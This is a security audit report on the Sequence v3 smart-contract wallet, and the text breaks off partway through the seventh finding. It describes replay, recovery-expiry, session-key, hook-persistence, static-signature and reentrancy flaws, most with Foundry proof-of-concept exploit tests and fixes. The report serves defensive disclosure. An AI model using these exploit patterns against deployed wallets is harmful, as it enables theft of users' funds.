# 2025 10 sequence - Findings Report
## Commit hash: b0e5fb15bf6735ec9aaba02f5eca28a7882d815d

##Findings by Pattern


 **Derived From** : Wallet configuration signers meeting threshold

[M-1]. Cross-Chain Replay of Payloads via noChainId Flag
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: Permissionless


**Derived From** : Social recovery guardians using Recovery module

[M-2]. Recovery Payloads Remain Valid Indefinitely
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: RequiresRole



 **Derived From** : Session key holders (explicit or implicit)

[M-3]. Session Keys Incompatible with ERC-4337 EntryPoint Flow
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Sub-threshold or revoked configuration signers: Malicious Hook Modules Persist After Signer Rotation

[M-4]. Malicious Hook Modules Persist After Signer Rotation
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: RequiresRole



 **Derived From** : Sub-threshold or revoked configuration signers

[H-5]. Persisted Static Signatures Enable Access for Revoked Signers
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: RequiresRole
[H-6]. Persisted Static Signatures Enable Access for Revoked Signers
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: RequiresRole



 **Derived From** : Hook modules installed through Hooks system

[M-7]. Authorized reentrancy via Hook modules bypassing ReentrancyGuard
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: RequiresRole



 **Derived From** : ERC4337 bundlers constructing UserOperations: Cross-Protocol Double Execution via Nonce Bypass in selfExecute

[M-8]. Cross-Protocol Double Execution via Nonce Bypass in selfExecute
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 2
- M: 6
- L: 0
- I: 0

##Findings by Pattern


 **Derived From** : Wallet configuration signers meeting threshold

## [M-1]. Cross-Chain Replay of Payloads via noChainId Flag

### Finding Severity Justification: The finding identifies a violation of the core 'Domain-Separated Signatures' invariant defined in the contest scope. By allowing the `noChainId` flag for `KIND_TRANSACTIONS`, the protocol enables users to sign chain-agnostic financial transactions. This creates a significant risk of cross-chain replay attacks if a user interacts with a malicious UI or makes a mistake, leading to potential loss of funds on secondary chains. While the exploit requires the user to sign a specific non-standard hash (limiting the severity from High), the protocol's failure to enforce the stated security guarantee makes this a valid Medium severity issue.
## Derived From Pattern/Invariant
Wallet configuration signers meeting threshold

## Exploit Type
ReplayAttack

## Location
Payload.domainSeparator

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `Payload` library and `BaseSig` support a `noChainId` flag which omits the chain ID from the EIP-712 domain separator. If a user signs a transaction with this flag (potentially by mistake or via a misleading UI), the signature becomes valid on all chains where the wallet has the same address and configuration. Attackers can replay these payloads on other chains to execute unintended actions.

## Impact
If a user signs a transaction payload with the `noChainId` flag enabled (likely due to a malicious UI or user error), that signature remains valid on any other EVM chain where the user's wallet shares the same address and configuration (signer). Attackers can replay this payload on all such chains, duplicating the transaction (e.g., transferring funds multiple times), provided the nonce state is synchronized (e.g., nonce 0 on both chains).

## Command to Run Test


## Proof of Concept
1. **Setup**: User has a Sequence v3 wallet on Chain A (ChainID 1) and Chain B (ChainID 2) with the same `imageHash` (signer/config) and nonce.
2. **Action**: User intends to sign a transaction for Chain A. However, the signature they generate uses the `noChainId` flag (`0x02` in the signature header). This forces the EIP-712 domain separator to use `chainId=0`.
3. **Exploit**: An attacker captures this payload and signature from Chain A.
4. **Replay**: The attacker submits the same payload and signature to the wallet on Chain B.
5. **Result**: The wallet on Chain B derives the same hash (due to `chainId=0`), validates the signature, and executes the transaction, effectively replaying the financial operation on the secondary chain.

## Proof of Code
import {Test, console} from "forge-std/Test.sol";
import {Stage2Module} from "src/Stage2Module.sol";
import {Payload} from "src/modules/Payload.sol";
import {LibOptim} from "src/utils/LibOptim.sol";
import {Storage} from "src/modules/Storage.sol";

contract CrossChainReplayTest is Test {
    using Payload for Payload.Decoded;

    Stage2Module wallet;
    uint256 signerPk = 0xA11CE;
    address signerAddr;

    // Stage2Auth IMAGE_HASH_KEY slot
    bytes32 constant IMAGE_HASH_KEY = 0xea7157fa25e3aa17d0ae2d5280fa4e24d421c61842aa85e45194e1145aa72bf8;

    function setUp() public {
        signerAddr = vm.addr(signerPk);
        wallet = new Stage2Module(address(0x1)); // Dummy EntryPoint

        // 1. Setup Wallet Configuration (Simple Tree: 1 Signer, Threshold 1)
        // root = keccak(keccak(keccak(leaf, threshold), checkpoint), checkpointer)
        bytes32 leaf = keccak256(abi.encodePacked("Sequence signer:\n", signerAddr, uint256(1)));
        bytes32 threshold = bytes32(uint256(1));
        bytes32 checkpoint = bytes32(uint256(0));
        
        bytes32 root = LibOptim.fkeccak256(leaf, threshold);
        root = LibOptim.fkeccak256(root, checkpoint);
        root = LibOptim.fkeccak256(root, bytes32(0)); // no checkpointer

        // Write config directly to storage to simulate deployed wallet
        vm.store(address(wallet), IMAGE_HASH_KEY, root);
    }

    function testReplayAttack() public {
        // 1. Create a Transaction Payload
        // Send 0 ETH to address(0xbeef)
        // Encoding: Global=0x11 (Space 0, Single Call) | Call Flags=0x00 | To=0xbeef
        bytes memory packed = abi.encodePacked(uint8(0x11), uint8(0x00), address(0xbeef));
        
        // Helper to generate hash to sign
        Payload.Decoded memory decoded = Payload.fromPackedCalls(packed);
        // FORCE noChainId for the signature generation
        decoded.noChainId = true;

        // 2. Generate Signature with noChainId flag
        // This generates a hash using chainId=0
        bytes32 digest = decoded.hashFor(address(wallet));
        
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest);
        
        // Construct Sequence Signature
        // Flag Byte: 0x02 (noChainId=true) | 0x00 (checkpoint 0-bytes) | 0x00 (threshold 1-byte default)
        bytes memory signature = abi.encodePacked(
            uint8(0x02),      // Flag
            uint8(0x01),      // Threshold (1)
            // Branch: Type 0 (Hash), Weight 1
            uint8(0x01),      
            r,
            _toCompact(s, v)
        );

        // 3. Execute on Chain A (ChainID 1)
        vm.chainId(1);
        wallet.execute(packed, signature);
        
        // 4. Replay on Chain B (ChainID 1337)
        // The same payload and signature work because the domain separator ignores the chainId
        vm.chainId(1337);
        wallet.execute(packed, signature);
    }

    function _toCompact(bytes32 s, uint8 v) internal pure returns (bytes32 yParityAndS) {
        yParityAndS = s;
        if (v == 28) {
            yParityAndS = bytes32(uint256(s) | (1 << 255));
        }
    }
}

## Suggested Mitigation
Modify `BaseSig.sol` (specifically the `recover` function) to revert if the `noChainId` flag is present on a payload of kind `KIND_TRANSACTIONS`. This ensures only non-financial payloads (like Config Updates) can be chain-agnostic.

```solidity
// In BaseSig.sol
function recover(...) internal view returns (...) {
  // ...
  // If the signature type is 10 we do a no chain id signature
  _payload.noChainId = signatureFlag & 0x02 == 0x02;

  // FIX: Disallow noChainId for transactions
  if (_payload.noChainId && _payload.kind == Payload.KIND_TRANSACTIONS) {
      revert("BaseSig: noChainId not allowed for transactions");
  }
  // ...
}
```





 **Derived From** : Social recovery guardians using Recovery module

## [M-2]. Recovery Payloads Remain Valid Indefinitely

### Finding Severity Justification: The lack of an expiration time for queued recovery payloads exposes the wallet to indefinite risk. If a guardian queues a payload (accidentally or maliciously) and the owner does not perform a gas-intensive configuration rotation to invalidate it, a compromised guardian can execute this payload years later. Standard security practice for timelocked critical operations requires an expiration window to prevent stale authorizations from being exploited.
## Derived From Pattern/Invariant
Social recovery guardians using Recovery module

## Exploit Type
TimelockEdgeCase

## Location
Recovery.queuePayload

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `Recovery` module allows guardians to queue payloads via `queuePayload`. The validity check in `_recoverBranch` enforces a minimum delay (`requiredDeltaTime`) but does not enforce an expiration time. Furthermore, there is no mechanism to remove or cancel a queued payload once it is in the `timestampForQueuedPayload` mapping. 

This means a queued recovery action remains valid indefinitely. If a guardian becomes malicious years later, or if the user wanted to cancel the recovery but forgot, the guardian can execute the payload. The only way to invalidate it is to perform a full configuration rotation of the wallet.

## Impact
Indefinite exposure to queued recovery actions. Once a payload is queued, it remains valid forever in the `Recovery` contract's storage. If a guardian's key is compromised years after a queue action (even if the action was intended and legitimate at the time but never executed), an attacker can execute the stale payload. This bypasses the security assumption that a guardian's authorization is only valid within a reasonable context window.

## Command to Run Test


## Proof of Concept
1. Guardian signs a payload to rotate the wallet owner key to a new key (or themselves). 
2. Guardian submits this via `queuePayload`. The `timestampForQueuedPayload` is set.
3. The wallet owner and guardian decide not to proceed, but do not invalidate the guardian or the specific payload (requires on-chain config change).
4. Years later, the guardian's private key is compromised.
5. The attacker constructs the recovery structure leaf (signer + delay parameters) and calls `recoverSapientSignatureCompact`.
6. The contract checks `block.timestamp - queuedAt >= requiredDeltaTime`. Since `queuedAt` is old, this passes. There is no upper bound check.
7. The payload executes, compromising the wallet.

## Proof of Code
import "forge-std/Test.sol";
import { Recovery } from "src/extensions/recovery/Recovery.sol";
import { Payload } from "src/modules/Payload.sol";

contract RecoveryTest is Test {
    Recovery recovery;
    address wallet = address(0x4242);
    uint256 guardianKey = 0xBAD5164;
    address guardian = vm.addr(guardianKey);

    function setUp() public {
        recovery = new Recovery();
    }

    function testIndefiniteRecovery() public {
        // 1. Setup a payload (e.g., a simple transaction)
        Payload.Call[] memory calls = new Payload.Call[](1);
        calls[0] = Payload.Call({
            to: address(0xCAFE),
            value: 0,
            data: hex"",
            gasLimit: 0,
            delegateCall: false,
            onlyFallback: false,
            behaviorOnError: 0
        });
        
        Payload.Decoded memory payload = Payload.Decoded({
            kind: Payload.KIND_TRANSACTIONS,
            noChainId: false,
            calls: calls,
            space: 0,
            nonce: 0,
            message: "",
            imageHash: bytes32(0),
            digest: bytes32(0),
            parentWallets: new address[](0)
        });

        // 2. Sign for Queueing (Requires 'Recovery Mode' domain hash)
        bytes32 signHash = recovery.recoveryPayloadHash(wallet, payload);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(guardianKey, signHash);
        
        // Create ERC-2098 Compact Signature (r + vs)
        bytes32 vs = bytes32((uint256(s) & 0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) | (uint256(v - 27) << 255));
        bytes memory guardianSignature = abi.encodePacked(r, vs);

        // 3. Queue the payload
        vm.warp(1000000);
        recovery.queuePayload(wallet, guardian, payload, guardianSignature);

        // 4. Warp 10 years into the future
        vm.warp(block.timestamp + 3650 days);

        // 5. Execute Recovery
        // The execution hash is the Standard domain hash, used as the storage key
        bytes32 executionHash = Payload.hashFor(payload, wallet);
        
        // Construct the structural bytes for _recoverBranch (Flag 1 | Signer | Delay | MinTimestamp)
        uint24 delay = 1 days;
        uint64 minTimestamp = 0;
        bytes memory recoveryStructure = abi.encodePacked(
            uint8(1),         // FLAG_RECOVERY_LEAF
            guardian,         // Signer
            delay,            // requiredDeltaTime
            minTimestamp      // minTimestamp
        );

        // This call verifies the payload is still valid and returns the root
        bytes32 root = recovery.recoverSapientSignatureCompact(executionHash, recoveryStructure);
        
        // Verify the root matches the expected leaf
        bytes32 expectedRoot = keccak256(abi.encodePacked("Sequence recovery leaf:\n", guardian, uint256(delay), uint256(minTimestamp)));
        assertEq(root, expectedRoot, "Root should match, proving validity 10 years later");
    }
}

## Suggested Mitigation
Introduce an expiration window in `_recoverBranch`. For example, enforce that `block.timestamp - queuedAt <= requiredDeltaTime + EXPIRATION_WINDOW` (where `EXPIRATION_WINDOW` could be 2 weeks). Additionally, verify that `msg.sender == _wallet` allows a `cancelPayload` function to clear the timestamp in `timestampForQueuedPayload`.





 **Derived From** : Session key holders (explicit or implicit)

## [M-3]. Session Keys Incompatible with ERC-4337 EntryPoint Flow

### Finding Severity Justification: The issue renders a core feature (Session Keys) incompatible with another core feature (ERC-4337 Account Abstraction). While it does not result in loss of funds, it breaks advertised functionality, preventing users from using granular session permissions with UserOperations. This is a Denial of Service for a specific but critical workflow.
## Derived From Pattern/Invariant
Session key holders (explicit or implicit)

## Exploit Type
Dos

## Location
SessionManager.recoverSapientSignature

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `SessionManager` contract is designed to work as a Sapient signer that validates permissions against the transaction calls inside a payload. It explicitly enforces that the payload kind must be `KIND_TRANSACTIONS` in `recoverSapientSignature`. 

However, in the ERC-4337 integration (`ERC4337v07.sol`), `validateUserOp` calls `isValidSignature` passing the `userOpHash`. The `BaseAuth` implementation of `isValidSignature` wraps this hash into a `Payload` of type `KIND_DIGEST`. When this payload is passed to `SessionManager`, it reverts because the kind is not `KIND_TRANSACTIONS`. Consequently, Session Keys cannot be used to authorize ERC-4337 UserOperations, breaking a core advertised feature.

## Impact
Session Keys (via SessionManager) are incompatible with the ERC-4337 flow. The `SessionManager` requires the payload kind to be `KIND_TRANSACTIONS` to inspect call data for permission validation. However, the standard `ERC4337v07` implementation calls `isValidSignature` with the `UserOpHash`, which `BaseAuth` wraps in a payload of `KIND_DIGEST`. This mismatch causes `SessionManager` to revert with `InvalidPayloadKind`, causing a Denial of Service for any UserOperation signed by a session key.

## Command to Run Test


## Proof of Concept
1. Deploy a `Stage2Module` wallet and a `SessionManager`. 
2. Configure the wallet to recognize the `SessionManager` as a Sapient signer (e.g., via a signature that resolves to it). 
3. Construct a standard ERC-4337 `UserOperation`. 
4. The EntryPoint calls `validateUserOp`, which calls `wallet.isValidSignature(userOpHash, signature)`. 
5. `isValidSignature` constructs a `Payload` from the digest (`kind=KIND_DIGEST`) and invokes `BaseSig.recover`. 
6. `BaseSig` identifies the Sapient signer flag and calls `SessionManager.recoverSapientSignature`. 
7. `SessionManager` checks `payload.kind`, sees `KIND_DIGEST`, and reverts with `InvalidPayloadKind`, failing the validation.

## Proof of Code
import "forge-std/Test.sol";
import "src/Stage2Module.sol";
import "src/extensions/sessions/SessionManager.sol";
import "src/extensions/sessions/SessionErrors.sol";

contract SessionKeyIncompatibilityTest is Test {
    Stage2Module wallet;
    SessionManager sessionManager;
    address entryPoint = address(0x999);

    function setUp() public {
        sessionManager = new SessionManager();
        wallet = new Stage2Module(entryPoint);
    }

    function test4337SessionKeyIncompatibility() public {
        // 1. Simulate a UserOpHash passed by EntryPoint
        bytes32 userOpHash = keccak256("UserOpHash");

        // 2. Construct a signature pointing to SessionManager as a Sapient signer
        // Format: [GlobalFlag(0x00)] [BranchFlag(0x91)] [Address] [Size(0)]
        // 0x91 = Flag 9 (Sapient) | Weight 1 | SizeSize 0
        bytes memory signature = abi.encodePacked(
            uint8(0x00),
            uint8(0x91),
            address(sessionManager),
            // No size bytes needed as SizeSize is 0, effectively passing empty sig data
            // This is sufficient because the revert happens on Payload Kind check first.
            "" 
        );

        // 3. Expect revert due to KIND_DIGEST being passed to SessionManager
        vm.expectRevert(SessionErrors.InvalidPayloadKind.selector);
        wallet.isValidSignature(userOpHash, signature);
    }
}

## Suggested Mitigation
To support Session Keys with ERC-4337, the `ERC4337v07` contract should be updated. Instead of calling `isValidSignature(userOpHash, sig)` (which validates a digest), the `validateUserOp` function should reconstruct a `Payload` (of kind `KIND_TRANSACTIONS`) from the `UserOperation.callData` and validate it against the authentication module directly. This allows the `SessionManager` to inspect the actual calls and enforce permissions. Alternatively, `SessionManager` could be updated to accept `KIND_DIGEST` if provided with a proof that links the digest to the valid transaction data, though this is more complex.





 **Derived From** : Sub-threshold or revoked configuration signers: Malicious Hook Modules Persist After Signer Rotation

## [M-4]. Malicious Hook Modules Persist After Signer Rotation

### Finding Severity Justification: The vulnerability allows a compromised signer (who met the threshold) to leave a 'backdoor' (malicious hook) that persists even after the legitimate owner performs a security rotation (updating the imageHash). This violates the security invariant that key rotation should invalidate previous access. While an attacker with threshold could steal funds immediately, this vulnerability specifically enables persistence and future theft after the user believes the wallet is secure, which is a significant integrity issue.
## Derived From Pattern/Invariant
Sub-threshold or revoked configuration signers: Malicious Hook Modules Persist After Signer Rotation

## Exploit Type
AccessControl

## Location
Hooks.setHook

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `Hooks` module stores installed hooks in the `HOOKS_KEY` mapping. When the wallet configuration is updated via `updateImageHash` (e.g., during social recovery to evict a malicious signer), the installed hooks are not cleared. If an attacker had installed a malicious hook (e.g., one that diverts funds on token receipt), this hook remains active even after the attacker is removed from the signer set. This violates the expectation that rotating keys secures the wallet against the previous owners.

## Impact
A compromised wallet remains vulnerable to malicious logic (hooks) even after the legitimate owner performs a security rotation/recovery. Specifically, an attacker who previously controlled the wallet can leave a 'backdoor' (e.g., a hook that intercepts token deposits) that persists and executes even after the attacker's signing keys have been removed via `updateImageHash`. This violates the security invariant that key rotation should invalidate the previous owner's access and configuration.

## Command to Run Test


## Proof of Concept
1. Attacker compromised Signer A installs a malicious hook for `onERC721Received` via `setHook`.
2. Wallet owner detects compromise and removes Signer A via `updateImageHash`.
3. Owner assumes wallet is safe and sends an NFT to the wallet.
4. The `onERC721Received` callback triggers the malicious hook, which steals the NFT or performs other unauthorized actions.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import "src/Stage2Module.sol";

// Mock implementation of a malicious hook
contract MaliciousHook {
    uint256 public triggerCount;
    
    function onERC721Received(
        address, 
        address, 
        uint256, 
        bytes calldata
    ) external returns (bytes4) {
        triggerCount++;
        return this.onERC721Received.selector;
    }
}

contract HooksPersistTest is Test {
    Stage2Module wallet;
    // Slot for IMAGE_HASH_KEY defined in Stage2Auth
    bytes32 constant IMAGE_HASH_KEY = bytes32(0xea7157fa25e3aa17d0ae2d5280fa4e24d421c61842aa85e45194e1145aa72bf8);
    
    function setUp() public {
        // Deploy the wallet module directly (acting as implementation/wallet)
        // We use the module as the wallet for direct storage manipulation testing
        wallet = new Stage2Module(address(0));
        
        // Initialize wallet with a dummy imageHash (Config A)
        bytes32 configA = keccak256("ConfigA");
        vm.store(address(wallet), IMAGE_HASH_KEY, configA);
    }

    function test_HooksPersistAfterRotation() public {
        MaliciousHook hook = new MaliciousHook();
        bytes4 selector = hook.onERC721Received.selector;

        // 1. Attacker (Config A) installs a malicious hook
        // setHook is 'onlySelf', so we prank the wallet itself to simulate an authorized call
        vm.prank(address(wallet));
        // Assuming setHook(bytes4,address) signature matches standard Sequence Hooks module
        (bool success, ) = address(wallet).call(
            abi.encodeWithSignature("setHook(bytes4,address)", selector, address(hook))
        );
        require(success, "Failed to set hook");

        // 2. Verify Hook works initially
        // Simulate receiving an NFT
        vm.prank(address(0x123)); 
        (success, ) = address(wallet).call(
            abi.encodeWithSelector(selector, address(0), address(0), 1, "")
        );
        require(success, "Hook call failed");
        assertEq(hook.triggerCount(), 1, "Hook should trigger");

        // 3. Owner rotates configuration (Config B) - Removing Attacker
        // This mimics the recovery flow where imageHash is updated
        bytes32 configB = keccak256("ConfigB");
        vm.prank(address(wallet)); 
        wallet.updateImageHash(configB);

        // Verify rotation occurred
        bytes32 currentHash = vm.load(address(wallet), IMAGE_HASH_KEY);
        assertEq(currentHash, configB, "ImageHash should have updated");

        // 4. Vulnerability Check: Hook persists under Config B
        // The attacker has been removed, but the hook remains in storage
        vm.prank(address(0x123));
        (success, ) = address(wallet).call(
            abi.encodeWithSelector(selector, address(0), address(0), 1, "")
        );
        require(success, "Hook call failed");
        
        // Assert that the hook triggered again (count is 2)
        // This confirms the vulnerability: the hook logic survived the auth rotation
        assertEq(hook.triggerCount(), 2, "Malicious hook persisted after rotation");
    }
}

## Suggested Mitigation
Modify the `Hooks` module to include an epoch or nonce in the storage key for hooks (e.g., `mapping(uint256 => mapping(bytes4 => address)) hooks`, where the uint256 is a configuration epoch). Increment this epoch in `updateImageHash`. This ensures that all hooks associated with the previous configuration are invalidated in O(1) gas complexity upon rotation. Alternatively, implement a mandatory `clearHooks` routine that is triggered during the `updateImageHash` flow.





 **Derived From** : Sub-threshold or revoked configuration signers

## [H-5]. Persisted Static Signatures Enable Access for Revoked Signers

### Finding Severity Justification: The vulnerability allows a revoked signer (or an attacker who temporarily compromised a key) to maintain persistent, unauthorized access to the wallet even after the owners have performed a security rotation (updated the image hash). By registering a static signature for a payload in a fresh nonce space, the attacker can bypass the new signer configuration and drain the wallet funds at any future time. This violates the core security invariant that updating the wallet configuration revokes old access.
## Derived From Pattern/Invariant
Sub-threshold or revoked configuration signers

## Exploit Type
AccessControl

## Location
BaseAuth.updateImageHash

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `BaseAuth` contract allows setting 'static signatures' via `setStaticSignature`. These are stored in the `STATIC_SIGNATURE_KEY` mapping. When the wallet configuration is updated (e.g., rotating signers via `updateImageHash`), the contract does not clear or invalidate these static signatures. 

A malicious signer can authorize a static signature for a malicious payload, then be removed from the wallet's signer set. Despite revocation, the static signature remains valid in storage, allowing the revoked signer to execute the payload and drain the wallet.

## Impact
Revoked signers maintain unauthorized access to the wallet by leveraging previously approved static signatures for future nonces, effectively bypassing the signer rotation and potentially draining funds.

## Command to Run Test


## Proof of Concept
1. Malicious signer A (currently valid) generates a payload P intended for a future nonce (e.g., currentNonce + 1). 
2. A calls `setStaticSignature(hash(P), A, expiry)` via a valid wallet transaction. 
3. Wallet owner performs a security rotation, removing A from the signer set (`updateImageHash`). 
4. The wallet continues operation until `currentNonce` matches P's nonce. 
5. A submits payload P with a static signature flag. 
6. `signatureValidation` finds the valid static signature for A and returns true, bypassing the check against the new `imageHash`. 
7. The transaction executes, allowing the revoked signer A to perform unauthorized actions.

## Proof of Code
import "forge-std/Test.sol";
import { Stage2Module } from "src/Stage2Module.sol";
import { Payload } from "src/modules/Payload.sol";
import { Storage } from "src/modules/Storage.sol";

contract StaticSigTest is Test {
    Stage2Module wallet;
    address attacker = address(0xBAD);
    address receiver = address(0x123);

    function setUp() public {
        // Deploy wallet (mocking Factory/EntryPoint addresses)
        wallet = new Stage2Module(address(0));
    }

    function testStaticSigPersistence() public {
        // 1. Construct a payload for a FUTURE nonce (nonce = 1)
        // Global: space=0 (0x11: space=0, nonceSize=0, singleCall)
        // NOTE: Actually need nonceSize=1 to encode nonce 1. 
        // Flag 0x13: space=0(1), nonceSize=1(001), singleCall(1)
        bytes memory payload = abi.encodePacked(
            uint8(0x13), 
            uint8(0x01), // Nonce 1
            uint8(0x00), // Call flags
            receiver     // Target
        );

        // 2. Calculate opHash
        Payload.Decoded memory decoded = Payload.fromPackedCalls(payload);
        bytes32 opHash = Payload.hashFor(decoded, address(wallet));

        // 3. Attacker (while valid) sets static signature
        vm.prank(address(wallet));
        wallet.setStaticSignature(opHash, attacker, uint96(block.timestamp + 1000));

        // 4. Rotate signers (Update Image Hash)
        vm.prank(address(wallet));
        wallet.updateImageHash(keccak256("newConfig"));

        // 5. Advance nonce to 1 (Mocking usage of nonce 0)
        // Nonce storage key for space 0
        bytes32 nonceKey = keccak256(abi.encode(bytes32(0x8d0bf1fd623d628c741362c1289948e57b3e2905218c676d3e69abee36d6ae2e), bytes32(0)));
        vm.store(address(wallet), nonceKey, bytes32(uint256(1)));

        // 6. Attacker executes payload using static sig (flag 0x80)
        // Even though they are removed from imageHash, static sig persists
        bytes memory signature = abi.encodePacked(uint8(0x80));
        
        vm.prank(attacker);
        wallet.execute(payload, signature);

        // 7. Verify nonce incremented (execution successful)
        assertEq(wallet.readNonce(0), 2);
    }
}

## Suggested Mitigation
Implement a global `epoch` counter stored in a dedicated storage slot. Increment this `epoch` within `_updateImageHash`. Modify `_setStaticSignature` and `_getStaticSignature` to include the current `epoch` in the mapping key derivation (e.g., use `keccak256(abi.encode(_hash, epoch))` as the sub-key instead of just `_hash`). This ensures that all previously registered static signatures become inaccessible immediately upon configuration rotation.


## [H-6]. Persisted Static Signatures Enable Access for Revoked Signers

### Finding Severity Justification: The vulnerability allows a revoked signer—who is no longer part of the wallet's configuration and is explicitly untrusted—to retain full access to the wallet via a previously established static signature. This effectively bypasses the wallet's key rotation and recovery mechanisms (Invariants: Authorized Signers Only, Image Hash Integrity). Since a revoked signer can drain all funds using this backdoor, the impact is High (Theft of assets). The likelihood is Occasional as it requires a signer to be malicious/compromised and set the persistence vector before removal.
## Derived From Pattern/Invariant
Sub-threshold or revoked configuration signers

## Exploit Type
AccessControl

## Location
BaseAuth.setStaticSignature

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
Static signatures allow pre-authorization of specific payloads. These signatures are stored in the `STATIC_SIGNATURE_KEY` mapping in `BaseAuth.sol` and are validated based on the payload hash (`opHash`). The `opHash` depends on the payload content and the domain separator (chain ID, contract address), but is completely independent of the wallet's current configuration (`imageHash`). 

When a wallet owner rotates signers via `updateImageHash` (e.g., to remove a compromised or malicious signer), the static signatures set by the previous signers are NOT cleared or invalidated. A removed signer who previously set a static signature (e.g., for a token drain transaction) can still execute that transaction even after being removed from the wallet's configuration, as `signatureValidation` checks the static signature storage before verifying the signer threshold.

## Impact
A revoked signer can maintain backdoor access to the wallet and drain funds or execute privileged actions using a previously established static signature, effectively bypassing the security of the key rotation/recovery process.

## Command to Run Test


## Proof of Concept
1. Malicious signer A (part of threshold) constructs a payload P to transfer funds to themselves.
2. Signer A calls `execute` with a payload to invoke `setStaticSignature(hash(P), A, farFutureTimestamp)`.
3. Wallet owner detects malice and rotates keys, removing Signer A via `updateImageHash`.
4. Signer A calls `execute(P)` providing the static signature flag.
5. `signatureValidation` finds the valid static signature for P (signed by A, who is the authorized caller in the static sig entry) and returns true, bypassing the new Merkle tree check.
6. P is executed, draining funds.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test} from "forge-std/Test.sol";
import {Stage2Module} from "src/Stage2Module.sol";
import {Payload} from "src/modules/Payload.sol";

// Harness to expose internal hashing logic matching the contract's context
contract WalletHarness is Stage2Module {
    using Payload for Payload.Decoded;
    constructor(address _entryPoint) Stage2Module(_entryPoint) {}

    function getPayloadHash(bytes calldata _payload) public view returns (bytes32) {
        Payload.Decoded memory decoded = Payload.fromPackedCalls(_payload);
        return decoded.hash();
    }
}

contract VulnerabilityTest is Test {
    WalletHarness wallet;
    address attacker = address(0xBAD);

    function setUp() public {
        wallet = new WalletHarness(address(0));
        vm.deal(address(wallet), 10 ether);
    }

    function testRevokedSignerCanUseStaticSig() public {
        // 1. Construct Payload P: Transfer 1 ether to attacker
        // Encoding: Global=0x11 (Space 0, Single Call), CallFlags=0x02 (Value present)
        bytes memory payload = abi.encodePacked(
            uint8(0x11),
            uint8(0x02),
            attacker,
            uint256(1 ether)
        );

        // Calculate opHash exactly as the wallet would
        bytes32 opHash = wallet.getPayloadHash(payload);

        // 2. Signer A (simulated as wallet self-call) sets static signature
        // This mimics an authorized signer executing 'setStaticSignature'
        vm.prank(address(wallet));
        wallet.setStaticSignature(opHash, attacker, uint96(block.timestamp + 1000));

        // 3. Wallet rotates keys (updates imageHash)
        // This effectively removes the old signer from the configuration
        bytes32 newConfig = keccak256("new_config_without_attacker");
        vm.prank(address(wallet));
        wallet.updateImageHash(newConfig);

        // Verify config updated
        assertEq(wallet.imageHash(), newConfig);

        // 4. Revoked Signer A executes P using the static signature
        // Signature 0x80 indicates static signature usage
        bytes memory signature = abi.encodePacked(uint8(0x80));

        uint256 preBalance = attacker.balance;
        
        vm.prank(attacker);
        wallet.execute(payload, signature);

        // 5. Assert success (funds transferred)
        assertEq(attacker.balance, preBalance + 1 ether);
    }
}

## Suggested Mitigation
Invalidate static signatures upon configuration update. This can be achieved by including a 'configuration nonce' or the current 'imageHash' in the key generation for `STATIC_SIGNATURE_KEY`, or by incrementing a global salt that is checked during static signature validation.





 **Derived From** : Hook modules installed through Hooks system

## [M-7]. Authorized reentrancy via Hook modules bypassing ReentrancyGuard

### Finding Severity Justification: The finding identifies a missing `nonReentrant` modifier on `selfExecute`. The protocol explicitly uses `ReentrancyGuard` on other execution entry points (`execute`, `executeUserOp`), establishing an invariant that execution should not be reentrant. The ability to bypass this guard via a Hook calling `selfExecute` violates this invariant and undermines the protection. While exploitation requires installing a hook, the architectural inconsistency and bypass of a security control warrant Medium severity.
## Derived From Pattern/Invariant
Hook modules installed through Hooks system

## Exploit Type
Reentrancy

## Location
Calls.selfExecute

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `Calls.sol` contract protects `execute` with `nonReentrant`. However, the `selfExecute` function, which is protected by `onlySelf`, lacks the `nonReentrant` modifier. 

If a transaction executes a call to an external contract (e.g., a token) that triggers a callback to the wallet (e.g., `onERC721Received`), and the wallet has a Hook installed for that selector, the Hook is executed via `delegatecall`. If the Hook calls `address(this).selfExecute(...)`, the call succeeds because `msg.sender` is the wallet. Since `selfExecute` does not check the `ReentrancyGuard`, it allows re-entering the execution flow (running a new batch of calls) while the outer `execute` is still running, effectively bypassing the reentrancy protection.

## Impact
Bypass of reentrancy protection, potentially leading to state inconsistencies if hooks are malicious or buggy.

## Command to Run Test


## Proof of Concept
1. Wallet calls `MaliciousToken.transfer`. 
2. `MaliciousToken` calls back `wallet.onReceived`. 
3. Wallet delegates to `Hook`. 
4. `Hook` calls `wallet.selfExecute(payload)`. 
5. `selfExecute` runs `_execute` nested inside the original `_execute`. 
